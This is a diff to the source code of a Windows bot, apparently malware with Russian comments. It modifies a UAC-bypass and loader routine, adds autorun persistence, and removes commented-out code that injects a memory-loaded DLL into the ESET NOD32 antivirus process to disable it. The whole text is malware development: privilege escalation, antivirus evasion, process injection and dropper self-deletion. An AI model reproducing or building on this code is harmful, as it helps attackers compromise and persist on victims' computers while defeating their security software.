@@ -129,9 +129,9 @@ void DeleteDropper() // убиваем процесс, стираем файл
 BOOL RunLoaderRoutine()
 {
 #ifdef UAC_bypassH
-	if( !RunBotBypassUAC(0) )
+//	if( !RunBotBypassUAC(0) )
 		return MegaJump( LoaderRoutine ) == TRUE;
-	return true;
+//	return true;
 #else
 	return MegaJump( LoaderRoutine );
 #endif
@@ -222,24 +222,6 @@ DWORD WINAPI LoaderRoutine( LPVOID lpData )
 	return 0;
 }
 
-/*
-static DWORD WINAPI NOD32Dll(void*)
-{
-	BOT::InitializeApi();
-	MDBG( "Main", "NOD32Dll()" );
-	DWORD dllSize;
-	BYTE* dll = File::ReadToBufferA( "c:\\1.dll", dllSize );
-	if( dll )
-	{
-	MDBG( "Main", "NOD32Dll() 1" );
-		MemoryLoadLibrary(dll);
-	MDBG( "Main", "NOD32Dll() 2" );
-		MemFree(dll);
-	}
-	return 0;
-}
-*/
-
 void ExplorerMain()
 {
 	BOT::Initialize();
@@ -257,12 +239,6 @@ void ExplorerMain()
 
 	// Отключаем отображение ошибок при крахе процесса
 	//DisableShowFatalErrorDialog();
-
-	MDBG( "Main", "Отключаем NOD32" );
-//	OffNOD32();
-//	DWORD dwPid = GetProcessIdByName("ekrn.exe");
-//	MDBG( "Main", "NOD32Dll() pid %d", dwPid );
-//	InjectIntoProcess2( dwPid, NOD32Dll );
 
 	InternalAddToAutorun();
 
@@ -353,11 +329,9 @@ int APIENTRY MyMain()
 	if( headers->FileHeader.Characteristics & IMAGE_FILE_DLL )
 	{
 		//exe бота запущен как dll, такое может быть при обходе различных защит
-		MDBG( "Main", "Запустили как DLL" );
-		MegaJump(LoaderRoutine);
-
-		pExitProcess(UAC_BYPASS_MAGIC_RETURN_CODE);
-		return 0;
+		MDBG( "Main", "Запустили как DLL после обхода UAC" );
+		if( ExecTaskAfterUAC() )
+			return 0;
 	}
 #endif //UAC_bypassH
 
